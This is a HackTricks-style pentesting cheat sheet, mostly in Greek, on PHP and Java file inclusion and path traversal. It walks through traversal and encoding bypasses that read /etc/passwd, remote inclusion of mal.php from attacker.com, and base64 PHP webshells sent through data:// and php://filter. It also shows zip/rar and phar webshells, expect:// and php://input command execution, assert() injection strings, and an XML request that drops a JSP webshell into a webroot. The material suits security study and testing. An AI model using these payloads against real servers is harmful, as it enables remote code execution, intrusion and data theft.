# File Inclusion/Path traversal

{{#include ../../banners/hacktricks-training.md}}

## File Inclusion

**Remote File Inclusion (RFI):** Το αρχείο φορτώνεται από έναν απομακρυσμένο διακομιστή (Καλύτερο: μπορείτε να γράψετε τον κώδικα και ο διακομιστής θα τον εκτελέσει). Στο php αυτό είναι **απενεργοποιημένο** από προεπιλογή (**allow_url_include**).\
**Local File Inclusion (LFI):** Ο διακομιστής φορτώνει ένα τοπικό αρχείο.

Η ευπάθεια προκύπτει όταν ο χρήστης μπορεί με κάποιο τρόπο να ελέγξει το αρχείο που πρόκειται να φορτωθεί από τον διακομιστή.

Ευάλωτες **PHP functions**: require, require_once, include, include_once

Ένα ενδιαφέρον εργαλείο για την εκμετάλλευση αυτής της ευπάθειας: [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## Blind - Interesting - LFI2RCE files
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**Συνδυάζοντας διάφορες \*nix LFI λίστες και προσθέτοντας περισσότερες διαδρομές δημιούργησα αυτή:**


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt
{{#endref}}

Δοκιμάστε επίσης να αλλάξετε `/` σε `\`\
Δοκιμάστε επίσης να προσθέσετε `../../../../../`

Μια λίστα που χρησιμοποιεί διάφορες τεχνικές για να βρει το αρχείο /etc/password (για να ελέγξετε αν υπάρχει η ευπάθεια) μπορεί να βρεθεί [here](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt)

### **Windows**

Συγχώνευση διαφορετικών wordlists:


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt
{{#endref}}

Δοκιμάστε επίσης να αλλάξετε `/` σε `\`\
Δοκιμάστε επίσης να αφαιρέσετε `C:/` και να προσθέσετε `../../../../../`

Μια λίστα που χρησιμοποιεί διάφορες τεχνικές για να βρει το αρχείο /boot.ini (για να ελέγξετε αν υπάρχει η ευπάθεια) μπορεί να βρεθεί [here](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt)

### **OS X**

Ελέγξτε τη λίστα LFI του linux.

## Βασικά LFI και bypasses

Όλα τα παραδείγματα αφορούν Local File Inclusion αλλά θα μπορούσαν να εφαρμοστούν και σε Remote File Inclusion επίσης (page=[http://myserver.com/phpshellcode.txt\\](<http://myserver.com/phpshellcode.txt)/>).
```
http://example.com/index.php?page=../../../etc/passwd
```
### traversal sequences αφαιρούνται μη αναδρομικά
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **Null byte (%00)**

Bypass την προσθήκη επιπλέον χαρακτήρων στο τέλος της παρεχόμενης συμβολοσειράς (bypass of: $\_GET\['param']."php")
```
http://example.com/index.php?page=../../../etc/passwd%00
```
Αυτό έχει **επιλυθεί από την PHP 5.4**

### **Κωδικοποίηση**

Μπορείτε να χρησιμοποιήσετε μη τυπικές κωδικοποιήσεις όπως double URL encode (και άλλες):
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### Από υπάρχον φάκελο

Ίσως το back-end ελέγχει τη διαδρομή του φακέλου:
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### Εξερεύνηση καταλόγων του συστήματος αρχείων σε διακομιστή

Το σύστημα αρχείων ενός διακομιστή μπορεί να εξερευνηθεί αναδρομικά για να εντοπιστούν κατάλογοι, όχι μόνο αρχεία, εφαρμόζοντας ορισμένες τεχνικές. Αυτή η διαδικασία περιλαμβάνει τον προσδιορισμό του βάθους των καταλόγων και την διερεύνηση της ύπαρξης συγκεκριμένων φακέλων. Παρακάτω ακολουθεί μια αναλυτική μέθοδος για την επίτευξη αυτού:

1. **Προσδιορίστε το Βάθος Καταλόγου:** Προσδιορίστε το βάθος του τρέχοντος καταλόγου σας επιτυχώς ανακτώντας το `/etc/passwd` (ισχύει αν ο διακομιστής βασίζεται σε Linux). Ένα παράδειγμα URL μπορεί να δομηθεί ως εξής, υποδεικνύοντας βάθος τριών επιπέδων:
```bash
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
2. **Έλεγχος για φακέλους:** Προσθέστε το όνομα του υποψιαζόμενου φακέλου (π.χ., `private`) στη διεύθυνση URL, στη συνέχεια πλοηγηθείτε ξανά στο `/etc/passwd`. Το επιπλέον επίπεδο καταλόγου απαιτεί την αύξηση του depth κατά ένα:
```bash
http://example.com/index.php?page=private/../../../../etc/passwd # depth of 3+1=4
```
3. **Ερμηνεία των Αποτελεσμάτων:** Η απάντηση του διακομιστή υποδεικνύει αν ο φάκελος υπάρχει:
- **Σφάλμα / Κανένα αποτέλεσμα:** Ο φάκελος `private` πιθανότατα δεν υπάρχει στην καθορισμένη τοποθεσία.
- **Περιεχόμενο του `/etc/passwd`:** Επιβεβαιώνεται η ύπαρξη του φακέλου `private`.
4. **Αναδρομική Εξερεύνηση:** Οι ανιχνευθέντες φάκελοι μπορούν να διερευνηθούν περαιτέρω για υποκαταλόγους ή αρχεία χρησιμοποιώντας την ίδια τεχνική ή παραδοσιακές μεθόδους Local File Inclusion (LFI).

Για την εξερεύνηση καταλόγων σε διαφορετικές τοποθεσίες στο σύστημα αρχείων, προσαρμόστε ανάλογα το payload. Για παράδειγμα, για να ελέγξετε αν το `/var/www/` περιέχει έναν φάκελο `private` (υποθέτοντας ότι ο τρέχων κατάλογος βρίσκεται σε βάθος 3), χρησιμοποιήστε:
```bash
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
### **Path Truncation Technique**

Το path truncation είναι μια μέθοδος που χρησιμοποιείται για να χειραγωγήσει διαδρομές αρχείων σε web εφαρμογές. Συχνά χρησιμοποιείται για να αποκτήσει πρόσβαση σε περιορισμένα αρχεία παρακάμπτοντας ορισμένα μέτρα ασφαλείας που προσθέτουν επιπλέον χαρακτήρες στο τέλος των διαδρομών αρχείων. Ο στόχος είναι να κατασκευαστεί μια διαδρομή αρχείου που, αφού τροποποιηθεί από το μέτρο ασφαλείας, εξακολουθεί να δείχνει στο επιθυμητό αρχείο.

Στο PHP, διάφορες αναπαραστάσεις μιας διαδρομής αρχείου μπορούν να θεωρηθούν ισοδύναμες λόγω της φύσης του συστήματος αρχείων. Για παράδειγμα:

- `/etc/passwd`, `/etc//passwd`, `/etc/./passwd`, and `/etc/passwd/` θεωρούνται όλες ως η ίδια διαδρομή.
- Όταν οι τελευταίοι 6 χαρακτήρες είναι `passwd`, η προσθήκη ενός `/` (μετατρέποντας το σε `passwd/`) δεν αλλάζει το στοχευόμενο αρχείο.
- Παρομοίως, αν στο τέλος μιας διαδρομής προστεθεί `.php` (π.χ. `shellcode.php`), η προσθήκη `/.` στο τέλος δεν θα αλλάξει το αρχείο που προσπελάζεται.

Τα παραδείγματα που ακολουθούν δείχνουν πώς να χρησιμοποιήσετε το path truncation για να αποκτήσετε πρόσβαση στο `/etc/passwd`, έναν συνηθισμένο στόχο λόγω του ευαίσθητου περιεχομένου του (πληροφορίες λογαριασμών χρηστών):
```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd......[ADD MORE]....
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
```

```
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
Σε αυτά τα σενάρια, ο αριθμός των απαιτούμενων traversals μπορεί να είναι περίπου 2027, αλλά αυτός ο αριθμός μπορεί να διαφέρει ανάλογα με τη διαμόρφωση του διακομιστή.

- **Using Dot Segments and Additional Characters**: Οι ακολουθίες traversal (`../`) σε συνδυασμό με επιπλέον dot segments και χαρακτήρες μπορούν να χρησιμοποιηθούν για να περιηγηθούν στο σύστημα αρχείων, αγνοώντας στην πράξη τις συμβολοσειρές που προσθέτει ο διακομιστής.
- **Determining the Required Number of Traversals**: Μέσω δοκιμών και σφαλμάτων, μπορεί κανείς να βρει τον ακριβή αριθμό των ακολουθιών `../` που χρειάζονται για να φτάσει στη ρίζα και μετά στο `/etc/passwd`, εξασφαλίζοντας ότι τυχόν προσαρτημένες συμβολοσειρές (όπως `.php`) εξουδετερώνονται ενώ η επιθυμητή διαδρομή (`/etc/passwd`) παραμένει ανέπαφη.
- **Starting with a Fake Directory**: Είναι κοινή πρακτική να ξεκινά η διαδρομή με έναν μη υπαρκτό κατάλογο (όπως `a/`). Αυτή η τεχνική χρησιμοποιείται ως προληπτικό μέτρο ή για να ικανοποιήσει τις απαιτήσεις της λογικής ανάλυσης διαδρομών του διακομιστή.

When employing path truncation techniques, it's crucial to understand the server's path parsing behavior and filesystem structure. Each scenario might require a different approach, and testing is often necessary to find the most effective method.

**This vulnerability was corrected in PHP 5.3.**

### **Filter bypass tricks**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## Remote File Inclusion

Στο php αυτό είναι απενεργοποιημένο από προεπιλογή επειδή **`allow_url_include`** είναι **Off.** Πρέπει να είναι **On** για να λειτουργήσει, και σε αυτή την περίπτωση θα μπορούσατε να συμπεριλάβετε ένα αρχείο PHP από τον server σας και να αποκτήσετε RCE:
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
Αν για κάποιο λόγο **`allow_url_include`** είναι **On**, αλλά PHP κάνει **filtering** στην πρόσβαση σε εξωτερικές ιστοσελίδες, [according to this post](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/), μπορείτε για παράδειγμα να χρησιμοποιήσετε το data protocol με base64 για να αποκωδικοποιήσετε έναν b64 PHP κώδικα και να αποκτήσετε RCE:
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
> [!TIP]
> Στον προηγούμενο κώδικα, το τελικό `+.txt` προστέθηκε επειδή ο attacker χρειαζόταν μια συμβολοσειρά που τελειώνει σε `.txt`, οπότε η συμβολοσειρά τελειώνει με αυτό και μετά την b64 decode εκείνο το τμήμα θα επιστρέψει απλώς άχρηστα δεδομένα και ο πραγματικός PHP κώδικας θα συμπεριληφθεί (και συνεπώς, θα εκτελεστεί).

Ένα άλλο παράδειγμα **που δεν χρησιμοποιεί το `php://` protocol** θα ήταν:
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
## Python Στοιχείο ρίζας

Σε python, σε έναν κώδικα όπως ο παρακάτω:
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
Αν ο χρήστης περάσει μια **απόλυτη διαδρομή** στο **`file_name`**, η **προηγούμενη διαδρομή απλώς αφαιρείται**:
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
Αυτή είναι η αναμενόμενη συμπεριφορά σύμφωνα με [the docs](https://docs.python.org/3.10/library/os.path.html#os.path.join):

> Εάν ένα στοιχείο είναι απόλυτο μονοπάτι, όλα τα προηγούμενα στοιχεία απορρίπτονται και η σύνδεση συνεχίζεται από το απόλυτο στοιχείο μονοπατιού.

## Java Λίστα καταλόγων

Φαίνεται ότι αν έχετε ένα Path Traversal σε Java και **ζητήσετε έναν κατάλογο** αντί για αρχείο, **επιστρέφεται μια λίστα του καταλόγου**. Αυτό δεν θα συμβαίνει σε άλλες γλώσσες (afaik).

## Κορυφαίες 25 παράμετροι

Παρακάτω είναι η λίστα με τις κορυφαίες 25 παραμέτρους που θα μπορούσαν να είναι ευάλωτες σε local file inclusion (LFI) vulnerabilities (from [link](https://twitter.com/trbughunters/status/1279768631845494787)):
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## LFI / RFI με PHP wrappers & protocols

### php://filter

PHP filters επιτρέπουν την εκτέλεση βασικών **λειτουργιών τροποποίησης στα δεδομένα** πριν αυτά διαβαστούν ή γραφτούν. Υπάρχουν 5 κατηγορίες φίλτρων:

- [String Filters](https://www.php.net/manual/en/filters.string.php):
- `string.rot13`
- `string.toupper`
- `string.tolower`
- `string.strip_tags`: Αφαιρεί tags από τα δεδομένα (ό,τι βρίσκεται μεταξύ των χαρακτήρων "<" και ">" )
- Note that this filter has disappear from the modern versions of PHP
- [Conversion Filters](https://www.php.net/manual/en/filters.convert.php)
- `convert.base64-encode`
- `convert.base64-decode`
- `convert.quoted-printable-encode`
- `convert.quoted-printable-decode`
- `convert.iconv.*` : Μετατρέπει σε διαφορετική κωδικοποίηση (`convert.iconv.<input_enc>.<output_enc>`). Για να λάβετε τη **λίστα όλων των κωδικοποιήσεων** που υποστηρίζονται τρέξτε στην κονσόλα: `iconv -l`

> [!WARNING]
> Καταχρηστική χρήση του φίλτρου μετατροπής `convert.iconv.*` μπορεί να σας επιτρέψει να **παράγετε αυθαίρετο κείμενο**, κάτι που μπορεί να είναι χρήσιμο για να γράψετε αυθαίρετο κείμενο ή να κάνετε μια συνάρτηση όπως include να επεξεργαστεί αυθαίρετο κείμενο. Για περισσότερες πληροφορίες δείτε [**LFI2RCE via php filters**](lfi2rce-via-php-filters.md).

- [Compression Filters](https://www.php.net/manual/en/filters.compression.php)
- `zlib.deflate`: Συμπιέζει το περιεχόμενο (χρήσιμο εάν εξάγετε μεγάλο όγκο πληροφοριών)
- `zlib.inflate`: Αποσυμπιέζει τα δεδομένα
- [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php)
- `mcrypt.*` : Deprecated
- `mdecrypt.*` : Deprecated
- Other Filters
- Εκτελώντας στο php `var_dump(stream_get_filters());` μπορείτε να βρείτε μερικά **αναπάντεχα φίλτρα**:
- `consumed`
- `dechunk`: αναιρεί την HTTP chunked κωδικοποίηση
- `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
> [!WARNING]
> Το τμήμα "php://filter" δεν διακρίνει πεζά-κεφαλαία

### Using php filters as oracle to read arbitrary files

[**In this post**](https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle) προτείνεται μια τεχνική για να διαβαστεί ένα τοπικό αρχείο χωρίς να επιστραφεί το περιεχόμενο από τον server. Αυτή η τεχνική βασίζεται σε μια **boolean exfiltration του αρχείου (char by char) χρησιμοποιώντας php filters** ως oracle. Αυτό οφείλεται στο ότι οι php filters μπορούν να χρησιμοποιηθούν για να κάνουν ένα κείμενο αρκετά μεγάλο ώστε να κάνουν το php να πετάξει exception.

Στο αρχικό post υπάρχει αναλυτική εξήγηση της τεχνικής, αλλά εδώ είναι μια σύντομη περίληψη:

- Χρησιμοποιήστε τον codec **`UCS-4LE`** για να αφήσετε τον αρχικό χαρακτήρα του κειμένου μπροστά και να κάνετε το μέγεθος της συμβολοσειράς να αυξάνεται εκθετικά.
- Αυτό θα χρησιμοποιηθεί για να παραχθεί ένα **κείμενο τόσο μεγάλο όταν η αρχική γραμμα είναι σωστά μαντευμένη** ώστε το php να προκαλέσει **σφάλμα**
- Το φίλτρο **dechunk** θα **αφαιρέσει τα πάντα αν ο πρώτος χαρακτήρας δεν είναι hexadecimal**, οπότε μπορούμε να γνωρίζουμε αν ο πρώτος χαρακτήρας είναι hex.
- Αυτό, σε συνδυασμό με το προηγούμενο (και άλλα filters ανάλογα με τον μαντευμένο χαρακτήρα), θα μας επιτρέψει να μαντέψουμε έναν χαρακτήρα στην αρχή του κειμένου βλέποντας πότε κάνουμε αρκετές μετατροπές ώστε να μην είναι πλέον δεκαεξαδικός χαρακτήρας. Διότι αν είναι hex, το dechunk δεν θα το διαγράψει και η αρχική βόμβα θα προκαλέσει σφάλμα στο php.
- Ο codec **convert.iconv.UNICODE.CP930** μετασχηματίζει κάθε γράμμα στο επόμενο (π.χ. a -> b). Αυτό μας επιτρέπει να ανακαλύψουμε αν ο πρώτος χαρακτήρας είναι `a`, για παράδειγμα, γιατί αν εφαρμόσουμε 6 από αυτούς τους codecs a->b->c->d->e->f->g ο χαρακτήρας δεν είναι πλέον δεκαεξαδικός, επομένως το dechunk δεν τον διαγράφει και το σφάλμα του php ενεργοποιείται λόγω της αρχικής βόμβας.
- Χρησιμοποιώντας άλλες μετατροπές όπως **rot13** στην αρχή είναι δυνατό να leak άλλους χαρακτήρες όπως n, o, p, q, r (και άλλοι codecs μπορούν να χρησιμοποιηθούν για να μετακινήσουν άλλα γράμματα στο hex range).
- Όταν ο αρχικός χαρακτήρας είναι αριθμός χρειάζεται να τον base64 encode-άρουμε και να leak-άρουμε τα πρώτα 2 γράμματα για να αποκαλύψουμε τον αριθμό.
- Το τελικό πρόβλημα είναι το πώς να leak-άσουμε περισσότερα από τον αρχικό χαρακτήρα. Χρησιμοποιώντας order memory filters όπως **convert.iconv.UTF16.UTF-16BE, convert.iconv.UCS-4.UCS-4LE, convert.iconv.UCS-4.UCS-4LE** είναι δυνατό να αλλάξουμε την σειρά των χαρακτήρων και να φέρουμε σε πρώτη θέση άλλα γράμματα του κειμένου.
- Και για να είμαστε ικανοί να πάρουμε **περαιτέρω δεδομένα** η ιδέα είναι να **παράγουμε 2 bytes junk data στην αρχή** με **convert.iconv.UTF16.UTF16**, να εφαρμόσουμε **UCS-4LE** ώστε να **pivot-άρει με τα επόμενα 2 bytes**, και να διαγράψουμε τα δεδομένα μέχρι τα junk data (αυτό θα αφαιρέσει τα πρώτα 2 bytes του αρχικού κειμένου). Συνεχίζουμε έτσι μέχρι να φτάσουμε στο επιθυμητό κομμάτι για να leak-άρουμε.

Στο post διατέθηκε επίσης ένα εργαλείο που εκτελεί αυτόματα τη διαδικασία: [php_filters_chain_oracle_exploit](https://github.com/synacktiv/php_filter_chains_oracle_exploit).

### php://fd

Αυτός ο wrapper επιτρέπει την πρόσβαση σε file descriptors που η διαδικασία έχει ανοικτά. Ενδεχομένως χρήσιμο για να exfiltrate το περιεχόμενο ανοικτών αρχείων:
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
Μπορείτε επίσης να χρησιμοποιήσετε τα **php://stdin, php://stdout and php://stderr** για να αποκτήσετε πρόσβαση στα **file descriptors 0, 1 and 2** αντίστοιχα (δεν είμαι σίγουρος πώς αυτό θα μπορούσε να είναι χρήσιμο σε μια attack)

### zip:// and rar://

Ανεβάστε ένα Zip ή Rar αρχείο με ένα PHPShell μέσα και αποκτήστε πρόσβαση σε αυτό.\
Για να μπορείτε να εκμεταλλευτείτε το rar protocol **πρέπει να ενεργοποιηθεί ειδικά**.
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
Σημειώστε ότι αυτό το πρωτόκολλο περιορίζεται από τις php ρυθμίσεις **`allow_url_open`** και **`allow_url_include`**

### expect://

Το Expect πρέπει να είναι ενεργοποιημένο. Μπορείτε να εκτελέσετε κώδικα χρησιμοποιώντας αυτό:
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### input://

Καθορίστε το payload στις παραμέτρους POST:
```bash
curl -XPOST "http://example.com/index.php?page=php://input" --data "<?php system('id'); ?>"
```
### phar://

Ένα αρχείο `.phar` μπορεί να χρησιμοποιηθεί για την εκτέλεση κώδικα PHP όταν μια web εφαρμογή εκμεταλλεύεται συναρτήσεις όπως η `include` για τη φόρτωση αρχείων. Το παρακάτω απόσπασμα κώδικα PHP δείχνει τη δημιουργία ενός αρχείου `.phar`:
```php
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');
$phar->stopBuffering();
```
Για να μεταγλωττιστεί το αρχείο `.phar`, πρέπει να εκτελεστεί η ακόλουθη εντολή:
```bash
php --define phar.readonly=0 create_path.php
```
Κατά την εκτέλεση, θα δημιουργηθεί ένα αρχείο με όνομα `test.phar`, το οποίο μπορεί ενδεχομένως να χρησιμοποιηθεί για την εκμετάλλευση ευπαθειών Local File Inclusion (LFI).

Σε περιπτώσεις όπου το LFI μόνο διαβάζει αρχεία χωρίς να εκτελεί τον PHP κώδικα μέσα σε αυτά, μέσω συναρτήσεων όπως `file_get_contents()`, `fopen()`, `file()`, `file_exists()`, `md5_file()`, `filemtime()`, ή `filesize()`, μπορεί να επιχειρηθεί εκμετάλλευση ευπάθειας αποσειριοποίησης. Αυτή η ευπάθεια σχετίζεται με το διάβασμα αρχείων χρησιμοποιώντας το πρωτόκολλο `phar`.

Για λεπτομερή κατανόηση της εκμετάλλευσης ευπαθειών αποσειριοποίησης στο πλαίσιο αρχείων `.phar`, ανατρέξτε στο παρακάτω συνδεδεμένο έγγραφο:

[Phar Deserialization Exploitation Guide](phar-deserialization.md)


{{#ref}}
phar-deserialization.md
{{#endref}}

### CVE-2024-2961

Ήταν δυνατό να καταχραστεί **any arbitrary file read from PHP that supports php filters** για να επιτευχθεί RCE. Η λεπτομερής περιγραφή μπορεί να [**found in this post**](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1)**.**\
Πολύ σύντομη περίληψη: μια **3 byte overflow** στο PHP heap εκμεταλλεύτηκε για να **alter the chain of free chunks** συγκεκριμένου μεγέθους προκειμένου να είναι δυνατή η **write anything in any address**, οπότε προστέθηκε ένα hook για να καλέσει **`system`**.\
Ήταν δυνατή η alloc chunks συγκεκριμένων μεγεθών μέσω κατάχρησης περισσότερων php filters.

### More protocols

Δείτε περισσότερα πιθανά[ **protocols to include here**](https://www.php.net/manual/en/wrappers.php)**:**

- [php://memory and php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) — Write in memory or in a temporary file (δεν είμαι σίγουρος πώς αυτό μπορεί να είναι χρήσιμο σε επίθεση file inclusion)
- [file://](https://www.php.net/manual/en/wrappers.file.php) — Πρόσβαση στο τοπικό filesystem
- [http://](https://www.php.net/manual/en/wrappers.http.php) — Πρόσβαση σε HTTP(s) URLs
- [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) — Πρόσβαση σε FTP(s) URLs
- [zlib://](https://www.php.net/manual/en/wrappers.compression.php) — Ροές συμπίεσης
- [glob://](https://www.php.net/manual/en/wrappers.glob.php) — Find pathnames matching pattern (Δεν επιστρέφει κάτι εκτυπώσιμο, οπότε δεν είναι ιδιαίτερα χρήσιμο εδώ)
- [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) — Secure Shell 2
- [ogg://](https://www.php.net/manual/en/wrappers.audio.php) — Audio streams (Δεν είναι χρήσιμο για να διαβάσει αυθαίρετα αρχεία)

## LFI via PHP's 'assert'

Οι κίνδυνοι Local File Inclusion (LFI) στην PHP είναι ιδιαίτερα υψηλοί όταν εμπλέκεται η συνάρτηση 'assert', η οποία μπορεί να εκτελέσει κώδικα μέσα σε strings. Αυτό είναι ιδιαίτερα προβληματικό αν γίνεται έλεγχος εισόδου που περιέχει χαρακτήρες directory traversal όπως ".." αλλά δεν γίνεται σωστή εξυγίανση.

Για παράδειγμα, ο PHP κώδικας μπορεί να σχεδιαστεί να αποτρέπει directory traversal ως εξής:
```bash
assert("strpos('$file', '..') === false") or die("");
```
Ενώ αυτό έχει ως στόχο να σταματήσει το traversal, δημιουργεί άθελά του ένα vector για code injection. Για να το εκμεταλλευτεί για την ανάγνωση του περιεχομένου αρχείων, ένας επιτιθέμενος θα μπορούσε να χρησιμοποιήσει:
```plaintext
' and die(highlight_file('/etc/passwd')) or '
```
Παρομοίως, για την εκτέλεση αυθαίρετων εντολών συστήματος, κάποιος μπορεί να χρησιμοποιήσει:
```plaintext
' and die(system("id")) or '
```
It's important to **URL-encode these payloads**.

## PHP Blind Path Traversal

> [!WARNING]
> Αυτή η τεχνική είναι σχετική σε περιπτώσεις όπου εσείς **ελέγχετε** τη **διαδρομή αρχείου** μιας **PHP function** που θα **έχει πρόσβαση σε ένα αρχείο** αλλά δεν θα δείτε το περιεχόμενο του αρχείου (όπως μια απλή κλήση σε **`file()`**) επειδή το περιεχόμενο δεν εμφανίζεται.

In [**this incredible post**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html) it's explained how a blind path traversal can be abused via PHP filter to **exfiltrate the content of a file via an error oracle**.

As sumary, the technique is using the **"UCS-4LE" encoding** to make the content of a file so **big** that the **PHP function opening** the file will trigger an **error**.

Then, in order to leak the first char the filter **`dechunk`** is used along with other such as **base64** or **rot13** and finally the filters **convert.iconv.UCS-4.UCS-4LE** and **convert.iconv.UTF16.UTF-16BE** are used to **place other chars at the beggining and leak them**.

**Συναρτήσεις που ίσως είναι ευάλωτες**: `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (only target read only with this)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

Για τις τεχνικές λεπτομέρειες δείτε το αναφερόμενο άρθρο!

## LFI2RCE

### Arbitrary File Write via Path Traversal (Webshell RCE)

When server-side code that ingests/uploads files builds the destination path using user-controlled data (e.g., a filename or URL) without canonicalising and validating it, `..` segments and absolute paths can escape the intended directory and cause an arbitrary file write. If you can place the payload under a web-exposed directory, you usually get unauthenticated RCE by dropping a webshell.

Typical exploitation workflow:
- Identify a write primitive in an endpoint or background worker that accepts a path/filename and writes content to disk (e.g., message-driven ingestion, XML/JSON command handlers, ZIP extractors, etc.).
- Determine web-exposed directories. Common examples:
- Apache/PHP: `/var/www/html/`
- Tomcat/Jetty: `<tomcat>/webapps/ROOT/` → drop `shell.jsp`
- IIS: `C:\inetpub\wwwroot\` → drop `shell.aspx`
- Craft a traversal path that breaks out of the intended storage directory into the webroot, and include your webshell content.
- Browse to the dropped payload and execute commands.

Σημειώσεις:
- The vulnerable service that performs the write may listen on a non-HTTP port (e.g., a JMF XML listener on TCP 4004). The main web portal (different port) will later serve your payload.
- On Java stacks, these file writes are often implemented with simple `File`/`Paths` concatenation. Lack of canonicalisation/allow-listing is the core flaw.

Generic XML/JMF-style example (product schemas vary – the DOCTYPE/body wrapper is irrelevant for the traversal):
```xml
<?xml version="1.0" encoding="UTF-8"?>
<JMF SenderID="hacktricks" Version="1.3">
<Command Type="SubmitQueueEntry">
<!-- Write outside the intake folder into the webroot via traversal -->
<Resource Name="FileName">../../../webapps/ROOT/shell.jsp</Resource>
<Data>
<![CDATA[
<%@ page import="java.io.*" %>
<%
String c = request.getParameter("cmd");
if (c != null) {
Process p = Runtime.getRuntime().exec(c);
try (var in = p.getInputStream(); var out = response.getOutputStream()) {
in.transferTo(out);
}
}
%>
]]>
</Data>
</Command>
</JMF>
```
